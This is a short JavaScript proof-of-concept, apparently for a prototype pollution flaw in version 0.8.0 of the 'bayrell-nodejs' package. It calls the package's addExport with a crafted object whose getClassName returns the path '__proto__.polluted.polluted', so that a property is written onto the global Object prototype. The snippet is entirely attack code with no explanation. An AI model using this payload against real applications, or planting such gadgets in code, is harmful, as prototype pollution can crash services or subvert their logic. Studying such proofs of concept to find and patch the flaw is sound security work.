const { use } = require('./bayrell-nodejs@0.8.0');

use.addExport({}, {
  getClassName: function() { return "__proto__.polluted.polluted"; },
  toString: function() { return "yes"; }
});